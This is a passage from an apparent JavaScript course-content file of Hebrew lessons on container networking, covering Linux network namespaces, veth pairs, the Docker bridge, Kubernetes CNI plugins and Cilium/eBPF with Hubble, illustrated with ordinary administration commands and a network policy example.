<p>RPKI adoption: נכון ל-2024, כ-40% מה-BGP routes העולמיים מוגנים ב-RPKI. Cloudflare, AWS, Google — כולם sign את ה-ROAs שלהם. ISPs גדולים כבר מDropping invalid routes.</p>
</div>`
      }
    ]
  },
  {
    id: 308,
    title: "Container Networking — כיצד Pods מדברים",
    pages: [
      {
        type: "explanation",
        title: "Linux Network Namespaces",
        content: `<div dir="rtl">
<h2>הבידוד שמאחורי Docker</h2>
<p>כשמריצים container ב-Docker, הוא מקבל <strong>network namespace</strong> משלו — הפשטה של kernel שמאפשרת לcontainer לחשוב שיש לו network stack נפרד לחלוטין: interfaces משלו, routing table משלו, iptables rules משלו.</p>
<pre><code># יצירת namespace ידנית (מה שDocker עושה אוטומטית)
ip netns add container1

# הרצת פקודה בnamespace
ip netns exec container1 ip addr show

# יצירת veth pair (virtual ethernet cable)
ip link add veth0 type veth peer name veth1

# העברת קצה אחד לnamespace
ip link set veth1 netns container1

# הוספה לbridge
ip link set veth0 master docker0

# הפעלה
ip netns exec container1 ip link set veth1 up
ip netns exec container1 ip addr add 172.17.0.2/16 dev veth1</code></pre>
<p>כל container מקבל <strong>veth pair</strong> — "כבל וירטואלי" שמקשר בין ה-namespace לbrige ה-host. Bridge <code>docker0</code> הוא ה-switch הוירטואלי שמחבר את כל הcontainers.</p>
</div>`
      },
      {
        type: "diagram",
        title: "Docker Networking Architecture",
        content: `<div dir="rtl">
<h2>veth pairs, Bridge, ו-NAT</h2>
<div class="diagram-container">
<svg viewBox="0 0 360 130" class="content-diagram">
  <rect x="5" y="5" width="350" height="120" rx="6" fill="#0f172a" stroke="#334155" stroke-width="1"/>
  <text x="180" y="18" text-anchor="middle" font-size="9" fill="#64748b">Host Network Namespace</text>
  <rect x="20" y="25" width="70" height="35" rx="4" fill="#1e293b" stroke="#3b82f6" stroke-width="1.5"/>
  <text x="55" y="40" text-anchor="middle" font-size="8" fill="#93c5fd">Container 1</text>
  <text x="55" y="52" text-anchor="middle" font-size="8" fill="#64748b">eth0: 172.17.0.2</text>
  <rect x="140" y="25" width="70" height="35" rx="4" fill="#1e293b" stroke="#3b82f6" stroke-width="1.5"/>
  <text x="175" y="40" text-anchor="middle" font-size="8" fill="#93c5fd">Container 2</text>
  <text x="175" y="52" text-anchor="middle" font-size="8" fill="#64748b">eth0: 172.17.0.3</text>
  <rect x="260" y="25" width="70" height="35" rx="4" fill="#1e293b" stroke="#3b82f6" stroke-width="1.5"/>
  <text x="295" y="40" text-anchor="middle" font-size="8" fill="#93c5fd">Container 3</text>
  <text x="295" y="52" text-anchor="middle" font-size="8" fill="#64748b">eth0: 172.17.0.4</text>
  <rect x="80" y="80" width="200" height="28" rx="4" fill="#1e293b" stroke="#22c55e" stroke-width="1.5"/>
  <text x="180" y="92" text-anchor="middle" font-size="9" fill="#86efac">docker0 bridge (172.17.0.1)</text>
  <text x="180" y="104" text-anchor="middle" font-size="8" fill="#64748b">virtual switch</text>
  <line x1="55" y1="60" x2="100" y2="80" stroke="#475569" stroke-width="1.5"/>
  <line x1="175" y1="60" x2="175" y2="80" stroke="#475569" stroke-width="1.5"/>
  <line x1="295" y1="60" x2="260" y2="80" stroke="#475569" stroke-width="1.5"/>
  <text x="55" y="73" text-anchor="middle" font-size="7" fill="#94a3b8">veth</text>
  <text x="175" y="73" text-anchor="middle" font-size="7" fill="#94a3b8">veth</text>
  <text x="295" y="73" text-anchor="middle" font-size="7" fill="#94a3b8">veth</text>
</svg>
</div>
<p>כשContainer 1 שולח packet לContainer 2: <code>veth pair</code> מוציא את ה-packet לbridge <code>docker0</code>, הbridge מחפש את ה-MAC של היעד ב-forwarding table, ושולח לveth של Container 2. ל-external traffic: iptables MASQUERADE (NAT) מחליף את ה-source IP ב-IP של ה-host.</p>
</div>`
      },
      {
        type: "explanation",
        title: "Kubernetes Pod Networking",
        content: `<div dir="rtl">
<h2>Pod-to-Pod: אותו Node vs Cross-Node</h2>
<p>Kubernetes דורש שכל Pod יוכל לדבר עם כל Pod אחר — ללא NAT. זו ה-<strong>CNI contract</strong> (Container Network Interface).</p>
<p><strong>אותו node:</strong> persis כמו Docker — veth pairs לbrige. Packets עוברים דרך bridge בL2.</p>
<p><strong>Cross-node:</strong> כאן נכנסים CNI plugins:</p>
<table class="content-table">
  <tr><th>CNI Plugin</th><th>טכנולוגיה</th><th>יתרון</th><th>חיסרון</th></tr>
  <tr><td><strong>Flannel</strong></td><td>VXLAN overlay</td><td>פשוט, עובד בכל מקום</td><td>overhead של encapsulation</td></tr>
  <tr><td><strong>Calico</strong></td><td>BGP routing</td><td>ביצועים גבוהים, Network Policy</td><td>מורכב יותר להגדרה</td></tr>
  <tr><td><strong>Cilium</strong></td><td>eBPF</td><td>L7 visibility, O(1) lookup</td><td>דורש kernel חדש</td></tr>
</table>
<pre><code># בדיקת interfaces ב-node
ip link show type veth

# Pod CIDR בkubernetes
kubectl get nodes -o jsonpath='{.items[*].spec.podCIDR}'

# Cilium connectivity check
cilium connectivity test

# tcpdump על veth של pod
VETH=$(ip link | grep -o "vethABCDEF")
tcpdump -i $VETH -n</code></pre>
<p><strong>Flannel VXLAN:</strong> packets בין nodes מוצפנים ב-UDP port 8472. הCNI יוצר tunnel. <strong>Calico BGP:</strong> כל node הוא BGP router, מפרסם את ה-pod CIDR שלו. Packets עוברים ב-L3 ישירות, ללא encapsulation — מהיר יותר.</p>
</div>`
      },
      {
        type: "explanation",
        title: "Cilium ו-eBPF Networking",
        content: `<div dir="rtl">
<h2>הדור הבא — eBPF מחליף iptables</h2>
<p>iptables בKubernetes עם 1000 services = 50,000+ rules. כל packet עובר linear scan. זה O(n) — כל service חדש מאט את הnetworking.</p>
<p>Cilium מחליף iptables ב-eBPF hash maps: כל lookup הוא O(1), ללא תלות בכמות הservices.</p>
<pre><code># Hubble — observability layer של Cilium
hubble observe --namespace production

# ראיית כל TCP flows
hubble observe --protocol TCP --verdict DROPPED

# Layer 7 visibility (HTTP)
hubble observe --http-status-code 500

# Cilium Network Policy — L7 HTTP
apiVersion: cilium.io/v2
kind: CiliumNetworkPolicy
metadata:
  name: allow-api
spec:
  endpointSelector:
    matchLabels:
      app: backend
  ingress:
  - fromEndpoints:
    - matchLabels:
        app: frontend
    toPorts:
    - ports:
      - port: "8080"
        protocol: TCP
      rules:
        http:
        - method: GET
          path: "/api/.*"</code></pre>
<p>Hubble מספקת real-time visibility: איזה pod מדבר עם איזה, HTTP status codes, latency — הכל בלי instrumentation של האפליקציה. זה <strong>service mesh ללא sidecar</strong>.</p>
</div>`
      }
    ]
  }
]
  }
]

// Backward compatibility — defaults to networking track chapters
export const chapters = tracks[0].chapters
